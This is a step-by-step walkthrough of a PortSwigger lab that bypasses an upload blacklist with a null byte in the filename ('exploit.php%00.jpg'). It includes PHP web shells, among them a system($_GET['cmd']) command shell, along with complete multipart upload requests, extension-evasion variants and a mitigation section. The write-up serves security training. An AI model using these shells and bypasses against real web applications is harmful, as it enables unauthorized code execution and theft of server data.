# 📘 PortSwigger Lab: Web shell upload via obfuscated file extension

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension  
> 🎯 Topic: Unrestricted File Upload — bypassing a blacklist via a null byte in the filename  
> 🧪 Difficulty: Practitioner  
> ✅ Status: Solved  

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [☠️ Null Byte — a Discrepancy Between Abstraction Levels](#null-byte)
- [🐚 Web Shell](#webshell)
- [⚡ The Exploit Payload](#exploit)
- [🔍 Step 1 — Recon the Upload Function and Serving Path](#step1)
- [🔍 Step 2 — Map the Filter](#step2)
- [🔍 Step 3 — Prepare the Bypass Request](#step3)
- [🔍 Step 4 — Upload with a Null Byte and Read the Server Signal](#step4)
- [🔍 Step 5 — Execute the Shell and Retrieve the Secret](#step5)
- [📨 Example Requests](#requests)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [🧪 Additional Tests](#additional-tests)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Bypass the extension blacklist with a classic filename obfuscation technique, to:

```text
1. Upload a PHP web shell under a masked extension.
2. Execute the shell via a GET request to the uploaded file.
3. Exfiltrate the contents of /home/carlos/secret and submit it as the solution.
```

Test user credentials:

```text
wiener:peter
```

---

<a id="theory"></a>

## 🧠 Short Theory

An extension blacklist blocks "dangerous" file suffixes. Classic obfuscation techniques exploit discrepancies between the components the filename passes through:

```text
validation (high-level)  →  URL decoder  →  file system  →  MIME handler
```

Each component defines the "end of the filename" and the "meaning of the suffix" differently.

**Null byte** (`%00`) is the most systemic technique: in low-level C/C++ functions the zero byte terminates a string, while high-level languages (PHP/Java) treat it as an ordinary character inside a string:

```text
Validation (PHP):   "exploit.php%00.jpg" — the suffix is .jpg → allowed
Storage (C):        exploit.php[NULL]... → the name ends at exploit.php
```

PHP closed this vector since version 5.3.4, but it lives on in legacy systems. The lab simulates a vulnerable configuration.

---

<a id="idea"></a>

## 🧩 Core Idea

One filename, two readings:

```text
filename="exploit.php%00.jpg"

Validation sees:  the suffix ".jpg"      → no ".php" → pass ✅
The server sees:  the name up to NUL     → "exploit.php"  → stores it as PHP
```

Confirmed by the server response: it names the uploaded file `exploit.php` — the null byte and `.jpg` "disappeared" at the storage level.

---

<a id="null-byte"></a>

## ☠️ Null Byte — a Discrepancy Between Abstraction Levels

Why `%00` works:

```text
1. The server's URL decoder turns "%00" into byte 0x00.
2. The high-level validation code sees the string
   "exploit.php\x00.jpg" — the suffix is ".jpg", all legal.
3. The low-level file-writing function (C-like semantics)
   treats 0x00 as end of string → only "exploit.php" is stored.
4. A file with a .php extension is stored — the server executes it as PHP.
```

This is exactly the same "check and execution see different strings" principle as in the previous labs:

```text
SSRF:           the filter decodes %2561dmin once, the HTTP client twice
Path traversal: sanitize sees ..%2f, the file system — ../
Here:           validation sees exploit.php%00.jpg, the FS — exploit.php
```

---

<a id="webshell"></a>

## 🐚 Web Shell

Minimal PHP shell for reading the target file:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Universal variant:

```php
<?php echo system($_GET['cmd']); ?>
```

---

<a id="exploit"></a>

## ⚡ The Exploit Payload

File to upload (`exploit.php`):

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Key modifications of the multipart part:

```text
filename="exploit.php%00.jpg"          ← name obfuscation
the part body → PHP code instead of image bytes   ← mandatory!
```

---

<a id="step1"></a>

## 🔍 Step 1 — Recon the Upload Function and Serving Path

1. Log in as `wiener:peter`.
2. Upload a normal image as the avatar.
3. Return to the account page.
4. In Burp → Proxy → HTTP history, find the avatar-serving request:

```http
GET /files/avatars/<YOUR-IMAGE> HTTP/1.1
```

and send it to Repeater.

**Practical nuance:** the image request may not appear in HTTP history. Causes and fixes:

```text
MIME filter:        enable MIME type "Images" in the history filter
Browser cache:      hard-refresh with Ctrl+F5
Workaround:         Target → Site map — the request will appear there,
                    right-click → Send to Repeater
Or manually:        right-click the avatar in the browser → Copy image address,
                    assemble the GET in Repeater yourself
```

---

<a id="step2"></a>

## 🔍 Step 2 — Map the Filter

1. Create a local `exploit.php`:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

2. Attempt to upload it as the avatar. The server responds:

```text
You can only upload JPG and PNG files.
```

Filter mapping:

```text
Mechanism:        an extension blacklist (JPG and PNG only)
Checked:          the file name suffix
Not checked:      the file content
```

---

<a id="step3"></a>

## 🔍 Step 3 — Prepare the Bypass Request

In HTTP history, find `POST /my-account/avatar` and send it to Repeater.

In the file part of the multipart body, change **two elements**:

```text
1. Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
2. Replace the part body entirely with the PHP code
```

The resulting part:

```text
------WebKitFormBoundaryhLxqR9zyleOT53Bs
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryhLxqR9zyleOT53Bs--
```

**Critical nuance:** if the original image bytes are left in the body, the server stores a binary JPEG named `exploit.php`. The PHP interpreter will run but print binary garbage — no secret. Replacing the body is mandatory.

Editing details:

```text
After Content-Type: image/jpeg — exactly one blank line, then the PHP code.
The next boundary stays untouched.
Content-Type: image/jpeg can stay — the server only checks the extension.
```

---

<a id="step4"></a>

## 🔍 Step 4 — Upload with a Null Byte and Read the Server Signal

Send the request. Response:

```text
The file avatars/exploit.php has been uploaded.
```

Signal breakdown:

```text
The server names the file "exploit.php"  →  %00.jpg was stripped at storage level
The upload passed                        →  validation saw the .jpg suffix
```

Two components read the same name differently — the vulnerability is confirmed.

**Practical tip:** verify the POST response contains exactly this phrase. If it still says `You can only upload JPG and PNG files.` — the null byte failed in that submission; check that `%00` is typed as three literal characters in the header, not a raw byte.

---

<a id="step5"></a>

## 🔍 Step 5 — Execute the Shell and Retrieve the Secret

In the Repeater tab with the avatar-serving request, replace the filename:

```http
GET /files/avatars/exploit.php HTTP/2
```

Send **again, after the upload** — the response panel may still show the previous result.

**How to tell the result apart:**

```text
ÿØÿà (bytes FF D8 FF E0)  → JPEG magic bytes: you requested an image, the shell failed
Readable text             → PHP executed, secret retrieved
Date header updated       → the request was actually processed again
```

Expected response — the secret:

```text
SECRET-VALUE-HERE
```

Submit the secret via the button in the lab banner.

The lab is marked:

```text
Solved
```

---

<a id="requests"></a>

## 📨 Example Requests

### Recon: avatar serving

```http
GET /files/avatars/avatar.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
```

The response is a binary JPEG (starts with `FF D8 FF E0`, shown in Burp as `ÿØÿà`), `Content-Type: text/html`, `Server: Apache/2.4.41 (Ubuntu)` — a hint that a .php file will be executed.

### Blocked upload (baseline)

```http
POST /my-account/avatar HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=------WebKitFormBoundaryhLxqR9zyleOT53Bs

------WebKitFormBoundaryhLxqR9zyleOT53Bs
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryhLxqR9zyleOT53Bs
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryhLxqR9zyleOT53Bs
Content-Disposition: form-data; name="csrf"

YOUR-CSRF-TOKEN
------WebKitFormBoundaryhLxqR9zyleOT53Bs--
```

Response:

```text
You can only upload JPG and PNG files.
```

### Working upload — null byte

```http
POST /my-account/avatar HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=------WebKitFormBoundaryhLxqR9zyleOT53Bs

------WebKitFormBoundaryhLxqR9zyleOT53Bs
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryhLxqR9zyleOT53Bs
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryhLxqR9zyleOT53Bs
Content-Disposition: form-data; name="csrf"

YOUR-CSRF-TOKEN
------WebKitFormBoundaryhLxqR9zyleOT53Bs--
```

### Request to the shell

```http
GET /files/avatars/exploit.php HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
```

---

<a id="response"></a>

## 📥 Example Result

### Working upload response

```text
The file avatars/exploit.php has been uploaded.
```

### Shell response

```text
HTTP/2 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8

SECRET-VALUE-HERE
```

Lab status:

```text
Solved
```

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Log in as wiener:peter
2. Upload a test image, find GET /files/avatars/ (history / Site map)
3. Attempt to upload exploit.php → blocked (JPG/PNG only)
4. Find POST /my-account/avatar, send to Repeater
5. filename="exploit.php%00.jpg" + replace the part body with PHP code
6. Send → the server names the file exploit.php
7. GET /files/avatars/exploit.php (send again!) → the secret in the response
8. Secret submitted — the lab is Solved
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

### 1. Validation Works at a High Abstraction Level

The PHP validation code sees `%00` as part of the string: the suffix is `.jpg`, all legal.

### 2. Storage Works at a Low Level

The low-level write function treats byte 0x00 as end-of-name — only `exploit.php` is stored.

### 3. The Content Is Never Checked

The filter looks only at the suffix. PHP code inside the part passes without obstacles — the server stores and executes it.

### 4. Parser Discrepancy = Bypass Space

The single source of truth — the filename — is read by two components differently. The attacker picked a notation where they diverge.

### 5. The Server Response Revealed the Mechanism

The message `The file avatars/exploit.php has been uploaded.` directly showed that the null byte was "eaten" at storage — free reconnaissance.

### 6. The Server Executes PHP in the Upload Directory

Apache with mod_php executes the stored `.php` → RCE.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

When facing an extension blacklist, do not brute-force blindly — map how the server processes the name:

```text
1. Case:             exploit.pHp → does it block case?
2. Double extension: exploit.php.jpg → which suffix is "real"?
3. Trailing:         exploit.php. → is the tail trimmed?
4. URL encoding:     exploit%2Ephp → decoded after validation?
5. Null byte:        exploit.php%00.jpg → what does the server call the file in the response?
```

Signals to read:

```text
Upload message       → the name the server considers final
Reaction to %00      → is there low-level name processing
Response Content-Type → text/html for an image hints at "serving files as-is"
```

---

<a id="additional-tests"></a>

## 🧪 Additional Tests

Within the authorized lab, the following can be compared:

### Universal shell

```php
<?php echo system($_GET['cmd']); ?>
```

```text
GET /files/avatars/exploit.php?cmd=whoami
```

### Other null byte forms

```text
filename="exploit.php%00.png"     → PNG instead of JPG
```

### Validation mapping

```text
exploit.pHp          → blocks case?
exploit.php.jpg      → which suffix is checked?
exploit%2Ephp        → decoded after validation?
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### Mistake 1. Leaving the Image Bytes in the Multipart Body

The most common mistake in this lab: only `filename` was changed, but the JPEG bytes remained. The server stores a binary JPEG as `exploit.php`, the PHP interpreter prints binary garbage — no secret. The part body must be **fully replaced** with the PHP code.

### Mistake 2. Not URL-Encoding the Null Byte

The name must carry `%00` as text (three characters: `%`, `0`, `0`) so the server decodes it into byte 0x00 itself. A raw NUL byte in the header can break multipart parsing.

### Mistake 3. Assuming the Null Byte "Failed" Without Reading the Response

The response `The file avatars/exploit.php has been uploaded.` is direct proof of success. The file is stored as PHP even if the name looked different in the browser.

### Mistake 4. Requesting the File with the %00 Name

After upload, the file on the server is `exploit.php` — request:

```text
GET /files/avatars/exploit.php
```

not `GET /files/avatars/exploit.php%00.jpg`.

### Mistake 5. Not Re-Sending the GET After the Upload

The Repeater response panel shows the latest result. If the GET was sent before the upload (or an old response was read), you see `ÿØÿà` and the same date as the previous response. Sign of a stale response: an **identical `Date:` header**. Re-send the GET after the upload.

### Mistake 6. Not Testing the Plain .php Baseline First

Without the baseline (`exploit.php` → blocked), you cannot know the filter exists or that the bypass worked.

### Mistake 7. Expecting %00 to Work on Modern PHP

PHP ≥ 5.3.4 rejects names with null bytes. The lab simulates legacy behavior; on real systems the vector applies only to old stacks.

---

<a id="defense"></a>

## 🛡 Mitigation

### 1. Do Not Use the Filename to Build the Path

Generate the name server-side (UUID) — then filename obfuscation is meaningless.

### 2. Reject Names with Control Bytes

Check that the name contains only safe characters:

```text
[a-zA-Z0-9._-]
```

Any `%00`, control bytes, or special characters → reject the upload.

### 3. Whitelist Extensions

Allow only `jpg`, `jpeg`, `png`, `webp` after **normalizing the name** (decoding, lowercasing).

### 4. Validate the Content

Magic bytes + image reprocessing — regardless of the name.

### 5. Modern Languages and Versions

Current PHP (≥ 5.3.4) and Java stacks reject null bytes in paths — keep dependencies updated.

### 6. Storage Outside the Web Root and No Execution

Remove the very possibility of executing uploaded files.

---

<a id="checklist"></a>

## ✅ Checklist

### Reconnaissance

- [ ] Logged in as wiener:peter
- [ ] Test image uploaded
- [ ] Found `GET /files/avatars/<image>` (history / Site map / Copy image address)
- [ ] GET request sent to Repeater

### Filter Mapping

- [ ] `exploit.php` upload blocked (JPG/PNG only)
- [ ] POST request sent to Repeater

### Exploitation

- [ ] filename changed to `exploit.php%00.jpg`
- [ ] Multipart body replaced with PHP code (not image bytes!)
- [ ] Upload passed, server names the file `exploit.php`
- [ ] `GET /files/avatars/exploit.php` re-sent after the upload
- [ ] Response contains the secret, not JPEG magic bytes (`ÿØÿà`)
- [ ] Secret submitted
- [ ] Lab status: Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The lab was solved via a **null byte in the filename**:

```text
1. Validation sees "exploit.php%00.jpg" → the suffix is .jpg → pass
2. Low-level storage treats 0x00 as end-of-name → exploit.php
3. The file is stored as PHP and executed by the server
4. The secret is read
```

Main lessons:

```text
Obfuscation works when validation and execution read the filename differently.
```

```text
The null byte is an abstraction-level discrepancy: C string semantics vs high-level languages.
```

```text
Name and content are two independent vectors: both must be under the attacker's control.
```

```text
A server response naming the final filename is free reconnaissance of the processing mechanics.
```

```text
Mitigation: server-side names, whitelist after normalization, rejection of control bytes.
```

---

[⬆ Back to top](#top)
